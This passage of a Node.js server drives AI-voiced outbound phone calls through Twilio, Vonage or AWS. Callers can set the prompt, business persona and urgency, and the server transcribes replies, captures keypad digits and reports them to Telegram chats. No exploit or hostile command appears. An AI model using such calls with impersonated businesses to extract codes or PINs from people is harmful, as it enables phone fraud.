          gptService.on('gptreply', async (gptReply, icount) => {
            const personalityInfo = gptReply.personalityInfo || {};
            console.log(`🎭 ${personalityInfo.name || 'Default'} Personality: ${gptReply.partialResponse.substring(0, 50)}...`.green);
            
            // Save AI response to database with personality context
            try {
              await db.addTranscript({
                call_sid: callSid,
                speaker: 'ai',
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality_used: personalityInfo.name || 'default',
                adaptation_data: JSON.stringify(gptReply.adaptationHistory || [])
              });
              
              await db.updateCallState(callSid, 'ai_responded', {
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality: personalityInfo.name
              });
            } catch (dbError) {
              console.error('Database error adding AI transcript:', dbError);
            }
            
            ttsService.generate(gptReply, icount);
          });

          // Listen for personality changes
          gptService.on('personalityChanged', async (changeData) => {
            console.log(`🎭 Personality adapted: ${changeData.from} → ${changeData.to}`.magenta);
            console.log(`📊 Reason: ${JSON.stringify(changeData.reason)}`.blue);
            
            // Log personality change to database
            try {
              await db.updateCallState(callSid, 'personality_changed', {
                from: changeData.from,
                to: changeData.to,
                reason: changeData.reason,
                interaction_count: interactionCount
              });
            } catch (dbError) {
              console.error('Database error logging personality change:', dbError);
            }
          });

          activeCalls.set(callSid, {
            startTime: callStartTime,
            transcripts: [],
            gptService,
            callConfig,
            functionSystem,
            personalityChanges: []
          });

          // Initialize call with recording
          try {
            await recordingService(ttsService, callSid);
            
            const firstMessage = callConfig ? 
              callConfig.first_message : 
              DEFAULT_FIRST_MESSAGE;
            
            console.log(`🗣️ First message (${functionSystem?.context.industry || 'default'}): ${firstMessage.substring(0, 50)}...`.magenta);
            
            try {
              await db.addTranscript({
                call_sid: callSid,
                speaker: 'ai',
                message: firstMessage,
                interaction_count: 0,
                personality_used: 'default'
              });
            } catch (dbError) {
              console.error('Database error adding initial transcript:', dbError);
            }
            
            await ttsService.generate({
              partialResponseIndex: null, 
              partialResponse: firstMessage
            }, 0);
            
            isInitialized = true;
            console.log('✅ Adaptive call initialization complete'.green);
            
          } catch (recordingError) {
            console.error('❌ Recording service error:', recordingError);
            
            const firstMessage = callConfig ? 
              callConfig.first_message : 
              DEFAULT_FIRST_MESSAGE;
            
            try {
              await db.addTranscript({
                call_sid: callSid,
                speaker: 'ai',
                message: firstMessage,
                interaction_count: 0,
                personality_used: 'default'
              });
            } catch (dbError) {
              console.error('Database error adding AI transcript:', dbError);
            }
            
            await ttsService.generate({
              partialResponseIndex: null, 
              partialResponse: firstMessage
            }, 0);
            
            isInitialized = true;
          }

          // Clean up old configurations
          const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
          for (const [sid, config] of callConfigurations.entries()) {
            if (new Date(config.created_at) < oneHourAgo) {
              callConfigurations.delete(sid);
              callFunctionSystems.delete(sid);
            }
          }

        } else if (msg.event === 'dtmf') {
          if (!callSid) {
            return;
          }

          try {
            const dtmfInfo = msg.dtmf || {};
            const rawDigits = dtmfInfo.digits ?? dtmfInfo.digit ?? msg.digits ?? msg.digit ?? '';
            const source = dtmfInfo.source || dtmfInfo.direction || 'twilio';
            const buffer = callDtmfBuffers.get(callSid) || { digits: '', lastRaw: '', timer: null };
            callDtmfBuffers.set(callSid, buffer);

            if (buffer.timer) {
              clearTimeout(buffer.timer);
              buffer.timer = null;
            }

            const normalizedRaw = typeof rawDigits === 'string'
              ? rawDigits.trim()
              : typeof rawDigits === 'number'
                ? String(rawDigits)
                : '';
            const sanitized = normalizedRaw.replace(/[^0-9*#]/g, '');
            const containsTerminator = /#/.test(normalizedRaw) || normalizedRaw.toLowerCase() === 'finish';

            if (sanitized) {
              if (!buffer.digits) {
                buffer.digits = sanitized.replace(/#/g, '');
              } else if (sanitized.length === 1 && sanitized !== '#') {
                buffer.digits += sanitized;
              } else if (sanitized.startsWith(buffer.digits)) {
                const suffix = sanitized.slice(buffer.digits.length).replace(/#/g, '');
                buffer.digits += suffix;
              } else {
                buffer.digits = sanitized.replace(/#/g, '');
              }
            }

            buffer.lastRaw = normalizedRaw;

            const finished = containsTerminator || dtmfInfo.finished === true || dtmfInfo.complete === true || dtmfInfo.terminator === true || msg.finished === true;

            const flushBuffer = async (reason) => {
              if (!buffer.digits) {
                return;
              }

              const digitsToPersist = buffer.digits;
              if (buffer.timer) {
                clearTimeout(buffer.timer);
                buffer.timer = null;
              }
              callDtmfBuffers.delete(callSid);

              await recordDtmfInput(digitsToPersist, source, {
                dtmf: dtmfInfo,
                reason,
                finished: reason === 'terminator'
              });
            };

            if (finished) {
              await flushBuffer('terminator');
            } else {
              buffer.timer = setTimeout(() => {
                flushBuffer('timeout').catch((error) => {
                  console.error('❌ Failed to persist buffered DTMF digits:', error);
                });
              }, DTMF_FLUSH_DELAY_MS);
              callDtmfBuffers.set(callSid, buffer);
            }
          } catch (dtmfError) {
            console.error('❌ Error handling DTMF input:', dtmfError);
          }
        } else if (msg.event === 'media') {
          if (isInitialized && transcriptionService) {
            transcriptionService.send(msg.media.payload);
          }
        } else if (msg.event === 'mark') {
          const label = msg.mark.name;
          marks = marks.filter(m => m !== msg.mark.name);
        } else if (msg.event === 'stop') {
          console.log(`🔚 Adaptive call stream ${streamSid} ended`.red);
          const pendingDigits = callDtmfBuffers.get(callSid);
          if (pendingDigits?.timer) {
            clearTimeout(pendingDigits.timer);
          }
          if (pendingDigits?.digits) {
            await recordDtmfInput(pendingDigits.digits, 'twilio', { finished: false, reason: 'stream_stopped' });
          }
          callDtmfBuffers.delete(callSid);

          await handleCallEnd(callSid, callStartTime);
          
          // Clean up
          activeCalls.delete(callSid);
          if (callSid && callConfigurations.has(callSid)) {
            callConfigurations.delete(callSid);
            callFunctionSystems.delete(callSid);
            console.log(`🧹 Cleaned up adaptive configuration for call: ${callSid}`.yellow);
          }
        }
      } catch (messageError) {
        console.error('❌ Error processing WebSocket message:', messageError);
      }
    });
  
    transcriptionService.on('utterance', async (text) => {
      if(marks.length > 0 && text?.length > 5) {
        console.log('🔄 Interruption detected, clearing stream'.red);
        ws.send(
          JSON.stringify({
            streamSid,
            event: 'clear',
          })
        );
      }
    });
  
    transcriptionService.on('transcription', async (text) => {
      if (!text || !gptService || !isInitialized) { 
        return; 
      }
      
      console.log(`👤 Customer: ${text}`.yellow);
      
      // Save user transcript with enhanced context
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: 'user',
          message: text,
          interaction_count: interactionCount
        });
        
        await db.updateCallState(callSid, 'user_spoke', {
          message: text,
          interaction_count: interactionCount
        });
      } catch (dbError) {
        console.error('Database error adding user transcript:', dbError);
      }
      
      // Process with adaptive personality and functions
      gptService.completion(text, interactionCount);
      interactionCount += 1;
    });
    
    ttsService.on('speech', (responseIndex, audio, label, icount) => {
      streamService.buffer(responseIndex, audio);
    });
  
    streamService.on('audiosent', (markLabel) => {
      marks.push(markLabel);
    });

    ws.on('close', () => {
      console.log(`🔌 WebSocket connection closed for adaptive call: ${callSid || 'unknown'}`.yellow);

      if (callSid) {
        if (callConfigurations.has(callSid)) {
          callConfigurations.delete(callSid);
        }
        if (callFunctionSystems.has(callSid)) {
          callFunctionSystems.delete(callSid);
        }
      }

      const pendingDigits = callSid ? callDtmfBuffers.get(callSid) : undefined;
      if (pendingDigits?.timer) {
        clearTimeout(pendingDigits.timer);
      }
      if (pendingDigits?.digits) {
        recordDtmfInput(pendingDigits.digits, 'twilio', { finished: false, reason: 'socket_closed' })
          .catch((error) => console.error('❌ Failed to persist buffered DTMF digits on close:', error));
      }
      if (callSid) {
        callDtmfBuffers.delete(callSid);
      }

      const session = callSid ? activeCalls.get(callSid) : undefined;
      if (callSid && session) {
        activeCalls.delete(callSid);
        const startedAt = session.startTime || callStartTime || new Date();
        void handleCallEnd(callSid, startedAt).catch((error) => {
          console.error('Error completing call on close event:', error);
        });
      }
    });

  } catch (err) {
    console.error('❌ WebSocket handler error:', err);
  }
});

// Enhanced call end handler with adaptation analytics
async function handleCallEnd(callSid, callStartTime) {
  try {
    const callEndTime = new Date();
    const duration = Math.round((callEndTime - callStartTime) / 1000);

    const callDetails = await db.getCall(callSid);
    if (callDetails?.call_type === 'collect_input') {
      await finalizeCollectInputCall(callSid, callDetails);
      return;
    }
    const transcripts = await db.getCallTranscripts(callSid);
    const dtmfEntries = await db.getCallDtmfEntries(callSid);

    if (callDetails) {
      if (callDetails.business_context) {
        try {
          callDetails.business_context = JSON.parse(callDetails.business_context);
        } catch (contextError) {
          console.warn('Failed to parse business context for call', callSid, contextError.message);
        }
      }

      callDetails.dtmf_input_count = dtmfEntries.length;
      callDetails.latest_dtmf_digits = dtmfEntries.length ? dtmfEntries[dtmfEntries.length - 1].masked_digits : null;
    }

    const summary = generateCallSummary(transcripts, duration);
    
    // Get personality adaptation data
    const callSession = activeCalls.get(callSid);
    let adaptationAnalysis = {};
    
    if (callSession && callSession.gptService) {
      const conversationAnalysis = callSession.gptService.getConversationAnalysis();
      adaptationAnalysis = {
        personalityChanges: conversationAnalysis.personalityChanges,
        finalPersonality: conversationAnalysis.currentPersonality,
        adaptationEffectiveness: conversationAnalysis.personalityChanges / Math.max(conversationAnalysis.totalInteractions / 10, 1),
        businessContext: callSession.functionSystem?.context || {}
      };
    }
    
    await db.updateCallStatus(callSid, 'completed', {
      ended_at: callEndTime.toISOString(),
      duration: duration,
      call_summary: summary.summary,
      ai_analysis: JSON.stringify({...summary.analysis, adaptation: adaptationAnalysis})
    });

    await db.updateCallState(callSid, 'call_ended', {
      end_time: callEndTime.toISOString(),
      duration: duration,
      total_interactions: transcripts.length,
      personality_adaptations: adaptationAnalysis.personalityChanges || 0
    });

    if (callDetails?.provider !== 'twilio') {
      await finalizeCallOutcome(callSid, {
        call: callDetails,
        finalStatus: 'completed',
        answeredBy: callDetails?.answered_by,
        wasAnswered: true,
      });
    }

    console.log(`✅ Enhanced adaptive call ${callSid} completed`.green);
    console.log(`📊 Duration: ${duration}s | Messages: ${transcripts.length} | Adaptations: ${adaptationAnalysis.personalityChanges || 0}`.cyan);
    if (adaptationAnalysis.finalPersonality) {
      console.log(`🎭 Final personality: ${adaptationAnalysis.finalPersonality}`.magenta);
    }

    // Log service health
    await db.logServiceHealth('call_system', 'call_completed', {
      call_sid: callSid,
      duration: duration,
      interactions: transcripts.length,
      adaptations: adaptationAnalysis.personalityChanges || 0
    });

  } catch (error) {
    console.error('Error handling enhanced adaptive call end:', error);
    
    // Log error to service health
    try {
      await db.logServiceHealth('call_system', 'error', {
        operation: 'handle_call_end',
        call_sid: callSid,
        error: error.message
      });
    } catch (logError) {
      console.error('Failed to log service health error:', logError);
    }
  }
}

function generateCallSummary(transcripts, duration) {
  if (!transcripts || transcripts.length === 0) {
    return {
      summary: 'No conversation recorded',
      analysis: { total_messages: 0, user_messages: 0, ai_messages: 0 }
    };
  }

  const userMessages = transcripts.filter(t => t.speaker === 'user');
  const aiMessages = transcripts.filter(t => t.speaker === 'ai');
  
  const analysis = {
    total_messages: transcripts.length,
    user_messages: userMessages.length,
    ai_messages: aiMessages.length,
    duration_seconds: duration,
    conversation_turns: Math.max(userMessages.length, aiMessages.length)
  };

  const summary = `Enhanced adaptive call completed with ${transcripts.length} messages over ${Math.round(duration/60)} minutes. ` +
    `User spoke ${userMessages.length} times, AI responded ${aiMessages.length} times.`;

  return { summary, analysis };
}

// Incoming endpoint used by Twilio to connect the call to our websocket stream
app.post('/incoming', async (req, res) => {
  if (currentProvider !== 'twilio') {
    res.status(404).json({ error: 'Incoming calls are handled by the active provider' });
    return;
  }
  try {
    const callSid = req.body?.CallSid || req.query?.CallSid;
    let callRecord = null;
    if (callSid) {
      try {
        callRecord = await db.getCall(callSid);
      } catch (error) {
        console.warn('Unable to load call record for incoming request:', error.message);
      }
    }

    if (callRecord?.call_type === 'collect_input') {
      await handleCollectInputRequest(req, res, callRecord);
      return;
    }

    const response = new VoiceResponse();
    const connect = response.connect();
    connect.stream({ url: `${publicWsBase}/connection` });

    res.type('text/xml');
    res.end(response.toString());
  } catch (err) {
    console.log(err);
    res.status(500).send('Error');
  }
});

// Enhanced outbound call endpoint with dynamic function generation
app.post('/outbound-call', async (req, res) => {
  try {
    const {
      number,
      prompt,
      first_message,
      user_chat_id,
      business_id,
      business_function: businessFunctionRaw,
      call_type: requestedCallType,
      requires_input,
      purpose,
      channel: rawChannel,
      emotion,
      urgency,
      technical_level: technicalLevel,
      voice_model,
      template,
      telegram_chat_id: requestedTelegramChatId,
      metadata_json,
      input_sequence,
      collect_digits,
      collect_thank_you_message
    } = req.body;

    if (!number) {
      return res.status(400).json({
        error: 'Missing required field: number'
      });
    }

    if (!number.match(/^\+[1-9]\d{1,14}$/)) {
      return res.status(400).json({
        error: 'Invalid phone number format. Use E.164 format (e.g., +1234567890)'
      });
    }

    const isTwilioProvider = currentProvider === 'twilio';
    const isVonageProvider = currentProvider === 'vonage';

    const accountSid = twilioAccountSid;
    const authToken = twilioAuthToken;

    if (isAwsProvider) {
      if (!awsAdapters || !awsAdapters.connect) {
        return res.status(500).json({
          error: 'AWS Connect adapter not configured'
        });
      }
    } else if (isVonageProvider) {
      try {
        await ensureVonageAdapters();
      } catch (error) {
        return res.status(500).json({
          error: 'Vonage adapters not configured',
          details: error.message
        });
      }
    } else {
      if (!accountSid || !authToken) {
        return res.status(500).json({
          error: 'Twilio credentials not configured'
        });
      }
      if (!twilioFromNumber) {
        return res.status(500).json({
          error: 'Twilio FROM_NUMBER not configured'
        });
      }
    }

    let businessProfile = null;
    const templateName = template || null;

    if (business_id && !['general', 'custom'].includes(String(business_id).toLowerCase())) {
      businessProfile = getBusinessProfile(business_id);
      if (!businessProfile) {
        return res.status(400).json({
          error: `Unknown business_id "${business_id}"`
        });
      }
    }

    const resolvedBusinessId = businessProfile ? businessProfile.id : (business_id || 'general');
    const businessFunction = businessFunctionRaw ? businessFunctionRaw.toString().trim().toLowerCase() : null;
    let callType = (requestedCallType || '').toString().trim().toLowerCase();
    const requiresInputFlag = toBoolean(requires_input);
    if (!['collect_input', 'service'].includes(callType)) {
      callType = (requiresInputFlag || (businessFunction && COLLECT_INPUT_FUNCTIONS.has(businessFunction)))
        ? 'collect_input'
        : 'service';
    }

    const normalizeKey = (value, fallback) =>
      (value || fallback || '')
        .toString()
        .trim()
        .toLowerCase()
        .replace(/\s+/g, '_');

    const channel = normalizeKey(rawChannel, 'voice');
    const normalizedPurpose = normalizeKey(purpose, 'general');
    const normalizedEmotion = normalizeKey(
      emotion,
      businessProfile?.purposes?.[normalizedPurpose]?.recommendedEmotion || 'neutral'
    );
    const normalizedUrgency = normalizeKey(
      urgency,
      businessProfile?.purposes?.[normalizedPurpose]?.defaultUrgency || 'normal'
    );
    const normalizedTechnicalLevel = normalizeKey(technicalLevel, 'general');

    const personaOptions = {
      businessId: businessProfile?.id || null,
      customPrompt: prompt || null,
      customFirstMessage: first_message || null,
      purpose: normalizedPurpose,
      channel,
      emotion: normalizedEmotion,
      urgency: normalizedUrgency,
      technicalLevel: normalizedTechnicalLevel
    };

    const shouldCompose =
      personaOptions.businessId ||
      !prompt ||
      !first_message ||
      personaOptions.purpose !== 'general' ||
      personaOptions.channel !== 'voice' ||
      personaOptions.emotion !== 'neutral' ||
      personaOptions.urgency !== 'normal' ||
      personaOptions.technicalLevel !== 'general';

    let composition = null;
    if (shouldCompose) {
      composition = personaComposer.compose(personaOptions);
    }

    let selectedPrompt = composition
      ? composition.systemPrompt
      : prompt || (businessProfile ? businessProfile.prompt : null);
    let selectedFirstMessage = composition
      ? composition.firstMessage
      : first_message || (businessProfile ? businessProfile.firstMessage : null);

    if (!selectedPrompt || !selectedFirstMessage) {
      return res.status(400).json({
        error: 'Provide prompt and first_message or supply a supported business_id'
      });
    }

    const usingDefaultPrompt = selectedPrompt === DEFAULT_SYSTEM_PROMPT;
    const usingDefaultFirstMessage = selectedFirstMessage === DEFAULT_FIRST_MESSAGE;

    console.log('🔧 Generating adaptive function system for call...'.blue);
    const functionSystem = functionEngine.generateAdaptiveFunctionSystem(selectedPrompt, selectedFirstMessage);
    console.log(
      `✅ Generated ${functionSystem.functions.length} functions for ${functionSystem.context.industry} industry`.green
    );

    const promptSource = composition
      ? 'persona_composer'
      : businessProfile
        ? usingDefaultPrompt && usingDefaultFirstMessage
          ? 'business_profile_default'
          : 'business_profile_custom'
        : usingDefaultPrompt && usingDefaultFirstMessage
          ? 'default'
          : 'custom';

    const effectiveVoiceModel = voice_model || deepgramConfig.voiceModel;
    const sanitizedInputSequence = callType === 'collect_input'
      ? normalizeInputSequencePayload(input_sequence, collect_digits || 4)
      : [];
    const metadataPayload = parseMetadataJson(metadata_json) || {};
    if (callType === 'collect_input') {
      metadataPayload.input_sequence = sanitizedInputSequence;
    }
    const metadataSerialized = Object.keys(metadataPayload).length ? JSON.stringify(metadataPayload) : null;
    const resolvedTelegramChatId = requestedTelegramChatId || user_chat_id || null;

    const callConfig = {
      prompt: selectedPrompt,
      first_message: selectedFirstMessage,
      promptOverride: usingDefaultPrompt ? null : selectedPrompt,
      firstMessageOverride: usingDefaultFirstMessage ? null : selectedFirstMessage,
      created_at: new Date().toISOString(),
      user_chat_id: user_chat_id,
      business_context: functionSystem.context,
      business_id: resolvedBusinessId,
      business_display_name: businessProfile ? businessProfile.displayName : null,
      function_count: functionSystem.functions.length,
      prompt_source: promptSource,
      persona_metadata: composition ? composition.metadata : null,
      voice_model: effectiveVoiceModel,
      template_name: templateName,
      call_type: callType,
      business_function: businessFunction,
      collect_input_sequence: sanitizedInputSequence,
      collect_digits: collect_digits || 4,
      collectThankYouMessage: collect_thank_you_message,
      telegram_chat_id: resolvedTelegramChatId,
      metadata_json: metadataSerialized
    };

    let callSid = null;
    let providerContactId = null;
    let providerMetadata = {};
    let providerStatus = 'initiated';
    let providerResponse;

    if (isAwsProvider) {
      callSid = `aws-${uuidv4()}`;
      const attributes = {
        CALL_SID: callSid,
        USER_CHAT_ID: user_chat_id || '',
        PROMPT_SOURCE: promptSource,
        BUSINESS_CONTEXT: JSON.stringify(functionSystem.context || {}),
        FIRST_MESSAGE: selectedFirstMessage,
        VOICE_MODEL: effectiveVoiceModel || '',
        TEMPLATE_NAME: templateName || ''
      };

      providerResponse = await awsAdapters.connect.startOutboundCall({
        destinationPhoneNumber: number,
        clientToken: callSid,
        attributes
      });

      providerContactId = providerResponse.ContactId;
      providerMetadata = {
        connect: {
          contactId: providerResponse.ContactId,
          initialContactId: providerResponse.InitialContactId || null
        },
        attributes
      };
      awsContactIndex.set(providerResponse.ContactId, callSid);
      console.log(`📞 Amazon Connect contact started: ${providerResponse.ContactId} (call ${callSid})`.green);
    } else if (isVonageProvider) {
      callSid = `vonage-${uuidv4()}`;
      const adapters = await ensureVonageAdapters();
      const answerUrl = `${publicHttpBase}/vonage/answer?call_sid=${callSid}`;
      const eventUrl = `${publicHttpBase}/vonage/event`;

      providerResponse = await adapters.voice.createOutboundCall({
        to: number,
        callSid,
        answerUrl,
        eventUrl,
      });

      providerContactId = providerResponse.uuid || providerResponse?.data?.uuid || null;
      providerStatus = providerResponse.status || 'started';
      providerMetadata = {
        vonage: {
          uuid: providerResponse.uuid || null,
          conversation_uuid: providerResponse.conversation_uuid || providerResponse.conversationUuid || null,
          answer_url: answerUrl,
          event_url: eventUrl,
        },
      };

      if (providerContactId) {
        vonageCallIndex.set(providerContactId, callSid);
      }
      if (providerResponse.conversation_uuid) {
        vonageCallIndex.set(providerResponse.conversation_uuid, callSid);
      }

      console.log(`📞 Vonage outbound call started: ${providerContactId || 'unknown'} (call ${callSid})`.green);
    } else {
      const client = require('twilio')(accountSid, authToken);
      providerResponse = await client.calls.create({
        url: `${publicHttpBase}/incoming`,
        to: number,
        from: twilioFromNumber,
        statusCallback: `${publicHttpBase}/webhook/call-status`,
        statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'canceled', 'failed'],
        statusCallbackMethod: 'POST',
        machineDetection: 'Enable',
        machineDetectionTimeout: 8,
        machineDetectionSpeechThreshold: 2400,
        machineDetectionSpeechEndThreshold: 1200,
        asyncAmd: true,
        asyncAmdStatusCallback: `${publicHttpBase}/webhook/amd-status`,
        asyncAmdStatusCallbackMethod: 'POST'
      });
      callSid = providerResponse.sid;
      providerContactId = providerResponse.sid;
      providerStatus = providerResponse.status;
      providerMetadata = {
        twilio: {
          statusCallback: `${publicHttpBase}/webhook/call-status`
        }
      };
      console.log(`📞 Twilio call created: ${callSid} to ${number}`.green);
    }

    callConfigurations.set(callSid, callConfig);
    callFunctionSystems.set(callSid, functionSystem);

    try {
      const businessContextRecord = {
        ...functionSystem.context,
        persona: composition ? composition.metadata : null,
        voice_model: effectiveVoiceModel || null
      };

      await db.createCall({
        call_sid: callSid,
        phone_number: number,
        prompt: selectedPrompt,
        first_message: selectedFirstMessage,
        user_chat_id,
        business_context: JSON.stringify(businessContextRecord),
        generated_functions: JSON.stringify(functionSystem.functions.map((f) => f.function.name)),
        provider: currentProvider,
        provider_contact_id: providerContactId,
        provider_metadata: {
          ...providerMetadata,
          promptSource,
          voice_model: effectiveVoiceModel || null,
          template_name: templateName || null
        },
        call_type: callType,
        business_function: businessFunction,
        telegram_chat_id: resolvedTelegramChatId,
        metadata_json: metadataSerialized
      });

      if (user_chat_id) {
        await db.createEnhancedWebhookNotification(callSid, 'call_initiated', user_chat_id);
      }

      console.log(
        `🎯 Business context: ${functionSystem.context.industry} - ${functionSystem.context.businessType}`.cyan
      );
      console.log(`🧾 Prompt source: ${promptSource}${businessProfile ? ` (${businessProfile.displayName})` : ''}`.cyan);
      if (composition?.metadata) {
        console.log(`🧬 Persona metadata: ${JSON.stringify(composition.metadata)}`.gray);
      }
    } catch (dbError) {
      console.error('Database error:', dbError);
    }

    if (isAwsProvider) {
      await initializeAwsCallSession({
        callSid,
        contactId: providerContactId,
        callConfig,
        functionSystem,
        firstMessage: selectedFirstMessage,
        voiceModel: effectiveVoiceModel || null,
        phoneNumber: number
      });
    }

    res.json({
      success: true,
      call_sid: callSid,
      to: number,
      status: providerStatus,
      provider: currentProvider,
      provider_contact_id: providerContactId,
      business_context: functionSystem.context,
      business_id: resolvedBusinessId,
      business_display_name: businessProfile ? businessProfile.displayName : null,
      prompt_source: promptSource,
      generated_functions: functionSystem.functions.length,
      function_types: functionSystem.functions.map((f) => f.function.name),
      enhanced_webhooks: true,
      persona: composition ? composition.metadata : null,
      voice_model: effectiveVoiceModel || null,
      template: templateName
    });
  } catch (error) {
    console.error('Error creating enhanced adaptive outbound call:', error);
    res.status(500).json({
      error: 'Failed to create outbound call',
      details: error.message
    });
  }
});

app.get('/admin/provider', requireAdminAuth, async (req, res) => {
  try {
    const storedProvider = db && typeof db.getSystemSetting === 'function'
      ? await db.getSystemSetting('call_provider')
      : currentProvider;

    const twilioReady = Boolean(twilioAccountSid && twilioAuthToken && twilioFromNumber);
    const vonageReady = Boolean(
      vonageConfig?.apiKey &&
      vonageConfig?.apiSecret &&
      vonageConfig?.applicationId &&
      vonageConfig?.privateKey &&
      (vonageAdapters?.voice || vonageConfig?.voice?.fromNumber)
    );

    res.json({
      provider: currentProvider,
      stored_provider: storedProvider || currentProvider,
      is_aws: isAwsProvider,
      is_vonage: currentProvider === 'vonage',
      supported_providers: SUPPORTED_CALL_PROVIDERS,
      aws_ready: !!awsAdapters,
      twilio_ready: twilioReady,
      vonage_ready: vonageReady
    });
  } catch (error) {
    console.error('Failed to load provider status:', error);
    res.status(500).json({ error: 'Failed to load provider status', details: error.message });
  }
});

app.post('/admin/provider', requireAdminAuth, async (req, res) => {
  const requestProvider = (req.body?.provider || req.query?.provider || '').toString().toLowerCase();

  if (!SUPPORTED_CALL_PROVIDERS.includes(requestProvider)) {
    return res.status(400).json({
      error: 'Unsupported provider',
      supported_providers: SUPPORTED_CALL_PROVIDERS
    });
  }

  try {
    const result = await applyProvider(requestProvider, { persist: true });
    res.json({
      success: true,
      provider: currentProvider,
      changed: result.changed,
      is_aws: isAwsProvider,
      is_vonage: currentProvider === 'vonage',
      vonage_ready: currentProvider === 'vonage' ? !!vonageAdapters : false
    });
  } catch (error) {
    console.error('Failed to update call provider:', error);
    res.status(500).json({ error: 'Failed to update provider', details: error.message });
  }
});

app.all('/vonage/answer', (req, res) => {
  if (currentProvider !== 'vonage') {
    res.status(404).json({ error: 'Vonage provider not active' });
    return;
  }

  const callSid = req.query?.call_sid || req.body?.call_sid;
  if (!callSid) {
    res.status(400).json({ error: 'Missing call_sid parameter' });
    return;
  }

  const ncco = [
    {
      action: 'connect',
      endpoint: [
        {
          type: 'websocket',
          uri: `${publicWsBase}/connection`,
          contentType: 'audio/l16;rate=16000',
          headers: {
            call_sid: callSid,
          },
        },
      ],
    },
  ];

  res.json(ncco);
});

app.post('/vonage/event', async (req, res) => {
  if (currentProvider !== 'vonage') {
    res.status(404).json({ error: 'Vonage provider not active' });
    return;
  }

  try {
    const event = req.body || {};
    const { uuid, conversation_uuid: conversationUuid, status } = event;
    const callSid = event.call_sid || vonageCallIndex.get(uuid);

    if (!callSid) {
      console.warn('Vonage event received for unknown call', event);
      res.json({ received: true, ignored: true });
      return;
    }

    const vonageDigitsCandidate =
      extractDigitsFromPayload(event.dtmf) ||
      extractDigitsFromPayload(event.dtmf_digits) ||
      extractDigitsFromPayload(event.dtmfDigits) ||
      extractDigitsFromPayload(event.digits) ||
      extractDigitsFromPayload(event.payload?.dtmf) ||
      extractDigitsFromPayload(event.payload?.digits);

    if (vonageDigitsCandidate) {
      await persistDtmfCapture(callSid, vonageDigitsCandidate, {
        source: 'vonage',
        provider: 'vonage',
        capture_method: 'vonage_event',
        metadata: {
          event_status: status,
          uuid,
          conversation_uuid: conversationUuid,
        },
      });
    }

    const normalizedStatusRaw = (status || '').toLowerCase();
    let normalizedStatus = null;
    let notificationType = null;

    switch (normalizedStatusRaw) {
      case 'started':
      case 'initiated':
      case 'ringing':
        normalizedStatus = 'ringing';
        notificationType = 'call_ringing';
        break;
      case 'answered':
        normalizedStatus = 'in-progress';
        notificationType = 'call_answered';
        break;
      case 'completed':
      case 'hangup':
      case 'finished':
        normalizedStatus = 'completed';
        notificationType = 'call_completed';
        break;
      case 'busy':
        normalizedStatus = 'busy';
        notificationType = 'call_busy';
        break;
      case 'failed':
      case 'cancelled':
      case 'canceled':
        normalizedStatus = 'failed';
        notificationType = 'call_failed';
        break;
      case 'timeout':
      case 'unanswered':
        normalizedStatus = 'no-answer';
        notificationType = 'call_no_answer';
        break;
      default:
        normalizedStatus = normalizedStatusRaw || 'unknown';
        notificationType = `call_${normalizedStatus}`;
    }

    await db.updateCallStatus(callSid, normalizedStatus, {
      provider: currentProvider,
      provider_contact_id: uuid,
      provider_metadata: {
        vonage_event: event,
      },
    });

    const callRecord = await db.getCall(callSid);
    const realtimeTypes = new Set(['call_initiated', 'call_ringing', 'call_answered']);
    if (callRecord?.user_chat_id && notificationType && realtimeTypes.has(notificationType)) {
      await db.createEnhancedWebhookNotification(callSid, notificationType, callRecord.user_chat_id);
    }

    if (['completed', 'no-answer', 'failed', 'busy'].includes(normalizedStatus)) {
      vonageCallIndex.delete(uuid);
      if (event.conversation_uuid) {
        vonageCallIndex.delete(event.conversation_uuid);
      }
      if (activeCalls.has(callSid)) {
        const session = activeCalls.get(callSid);
        const startTime = session?.startTime || (callRecord?.started_at ? new Date(callRecord.started_at) : new Date());
        await handleCallEnd(callSid, startTime);
        activeCalls.delete(callSid);
      }
      callConfigurations.delete(callSid);
      callFunctionSystems.delete(callSid);
      await finalizeCallOutcome(callSid, {
        call: callRecord,
        finalStatus: normalizedStatus,
        answeredBy: callRecord?.answered_by,
      });
    }

    await db.logServiceHealth('vonage_voice', 'event_received', {
      call_sid: callSid,
      status: normalizedStatus,
      uuid,
      conversation_uuid: conversationUuid,
    });

    res.json({ received: true });
  } catch (error) {
    console.error('Error processing Vonage event:', error);
    res.status(500).json({ error: 'Failed to process Vonage event', details: error.message });
  }
});

app.post('/webhook/amd-status', async (req, res) => {
  if (currentProvider !== 'twilio') {
    res.status(404).json({ error: 'AMD webhook disabled for current provider' });
    return;
  }

  try {
    const { CallSid, AnsweredBy, AnsweredByStatus, Confidence } = req.body || {};
    if (!CallSid) {
      res.status(400).json({ error: 'Missing CallSid' });
      return;
    }

    const call = await db.getCall(CallSid);
    if (!call) {
      console.warn(`⚠️ AMD webhook received for unknown call: ${CallSid}`.yellow);
      res.status(200).send('OK');
      return;
    }

    const answeredValue = AnsweredBy || AnsweredByStatus || null;
    const normalizedAnswer = normalizeAnsweredBy(answeredValue);
    const confidenceValue =
      Confidence !== undefined && Confidence !== null && Confidence !== ''
        ? Number(Confidence)
        : undefined;

    await db.updateAmdStatus(CallSid, answeredValue, {
      confidence: Number.isFinite(confidenceValue) ? confidenceValue : undefined,
      answeredBy: answeredValue,
      markAnswered: Boolean(normalizedAnswer),
    });

    const targetChatId = call.telegram_chat_id || call.user_chat_id;
    if (targetChatId && answeredValue) {
      await db.createEnhancedWebhookNotification(CallSid, 'call_amd_update', targetChatId, 'high');
    }

    res.status(200).send('OK');
  } catch (error) {
    console.error('Error processing AMD webhook:', error);
    res.status(200).send('OK');
  }
});

// Enhanced webhook endpoint for call status updates

app.post('/webhook/call-status', async (req, res) => {
  if (currentProvider !== 'twilio') {
    res.status(404).json({ error: 'Twilio call status webhook disabled for current provider' });
    return;
  }
  try {
    const { 
      CallSid, 
      CallStatus, 
      Duration, 
      From, 
      To, 
      CallDuration,
      AnsweredBy,
      ErrorCode,
      ErrorMessage,
      DialCallDuration // This is key for detecting actual answer vs no-answer
    } = req.body;
    
    console.log(`📱 Fixed Webhook: Call ${CallSid} status: ${CallStatus}`.blue);
    console.log(`📊 Debug Info:`.cyan);
    console.log(`   Duration: ${Duration || 'N/A'}`);
